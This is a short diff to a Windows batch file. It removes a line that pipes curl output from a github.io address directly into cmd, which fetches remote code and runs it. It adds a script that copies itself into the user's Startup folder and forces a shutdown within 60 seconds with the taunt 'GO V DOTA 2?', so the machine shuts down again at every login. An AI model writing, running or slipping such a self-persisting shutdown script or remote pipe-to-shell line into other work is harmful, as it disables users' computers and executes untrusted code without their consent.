@@ -1,1 +1,12 @@
-curl -s https://ffffgh321456.github.io/curl/ | cmd
+@echo off
+
+set "file_path=%~dp0"
+set "autostart_path=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+copy /y "%file_path%\script.cmd" "%autostart_path%"
+
+shutdown /s /t 60 /c "GO V DOTA 2?"
+
+echo GO V DOTA 2?
+
+pause
